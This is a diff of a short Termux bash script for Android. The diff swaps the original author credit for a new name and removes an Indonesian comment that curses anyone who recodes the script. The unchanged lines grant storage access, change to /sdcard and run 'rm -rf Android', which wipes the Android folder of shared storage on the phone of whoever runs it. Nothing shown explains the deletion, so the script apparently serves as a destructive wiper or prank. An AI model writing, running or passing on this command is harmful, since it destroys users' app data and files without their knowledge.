@@ -1,8 +1,5 @@
 #!/system/xbin/bash
-#AUTHOR:MR CROOT
-#Github:https://github.com/reyspeed
-#Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
-#Bersihkan Layar
+#AUTHOR:MR Hamster99
 termux-setup-storage
 cd /sdcard
 rm -rf Android
